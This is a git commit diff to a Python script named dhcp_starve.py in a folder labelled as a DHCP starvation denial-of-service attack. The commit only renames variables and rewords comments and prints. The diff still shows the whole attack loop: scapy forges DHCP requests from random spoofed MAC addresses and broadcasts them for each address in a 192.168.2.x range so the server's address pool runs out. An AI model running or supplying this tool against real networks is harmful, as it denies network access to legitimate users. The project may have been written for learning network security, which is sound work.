de8bf0c49bff93443b65e9e87e71fa384600f7c3
Kathan1210 <kathanvaidya12@gmail.com>
2022-12-11 18:27:07 -0500

    Updated DHCP Starvation Range

--- DHCP Starvation - DOS/dhcp_starve.py
+++ DHCP Starvation - DOS/dhcp_starve.py
@@ -4,14 +4,11 @@ from time import sleep
 from scapy.all import *
 from threading import Thread
 
-#The given function is used to store Mac Address after being spoofed and IP addresses from 192.168.0.2 to 192.168.0.254 excluding as 192.168.0.1 is the DHCP server.
 
 class Storage_DHCP(object):
     def __init__(self):
         self.mac_address = []
         self.ip_address = []
-        
-#The given function maintains the ACK (acknowledge) and NAK (negative acknowledgement) for all requested IPs
 
     def requireMaintain(self,pkt):
     	if pkt[DHCP]:
@@ -21,10 +18,10 @@ class Storage_DHCP(object):
             	# Appending IPs to ip list
             	self.ip_address.append(pkt[IP].dst)  
             	print(str(pkt[IP].dst)+" registered")
-            	print("Acknowledgement Packet Sent.")
+            	print("Packet for Acknowledgement has been Sent.")
         	# NAK (negative acknowledgement)           
             elif pkt[DHCP].options[0][1]==6:
-            	print("Negative Acknowledgement Packet Sent.")
+            	print("Packet for Negative Acknowledgement has been Sent.")
             
 # This function performs sniffing of UDP traffic 
 
@@ -49,30 +46,30 @@ class Storage_DHCP(object):
         for i in range(0,200): #Range from 10 till 254
             if i == 0: 
                 continue
-            req_ip_addr = "192.168.2."+str(9+i)
+            required_ip_address = "192.168.2."+str(9+i)
             
             #If all IP are registered before already
-            
-            if req_ip_addr in self.ip_address:
+
+            if required_ip_address in self.ip_address:
                 continue
             # Storing mac address in the mac list to avoid duplicates of the mac address
-            spoof_mac = ""
-            while spoof_mac in self.mac_address:
-                spoof_mac = RandMAC()
-            self.mac_address.append(spoof_mac)
+            spoofing_mac_addr = ""
+            while spoofing_mac_addr in self.mac_address:
+                spoofing_mac_addr = RandMAC()
+            self.mac_address.append(spoofing_mac_addr)
             
             # Layers being defined
             
-            hw=spoof_mac
-            pkt = Ether(src=RandMAC(), dst="ff:ff:ff:ff:ff:ff")/ IP(src="0.0.0.0", dst="255.255.255.255")/ UDP(sport=68, dport=67)/BOOTP(chaddr=hw)/DHCP(options=[("message-type", "request"),("requested_addr", req_ip_addr),("server_id", "192.168.2.1"),"end"])
+            hw=spoofing_mac_addr
+            pkt = Ether(src=RandMAC(), dst="ff:ff:ff:ff:ff:ff")/ IP(src="0.0.0.0", dst="255.255.255.255")/ UDP(sport=68, dport=67)/BOOTP(chaddr=hw)/DHCP(options=[("message-type", "request"),("requested_addr", required_ip_address),("server_id", "192.168.2.1"),"end"])
            
             # Packet is sent one by one
            
             sendp(pkt)
-            print("Trying.... "+req_ip_addr)
-            print("Current lenght is ",len(self.ip_address))
+            print("Trying.... "+required_ip_address)
+            print("Current length is ",len(self.ip_address))
             print("check")
-            sleep(0.5) #make the thread sleep for some time
+            sleep(0.5) #This makes the thread sleep for sometime
             
 
 
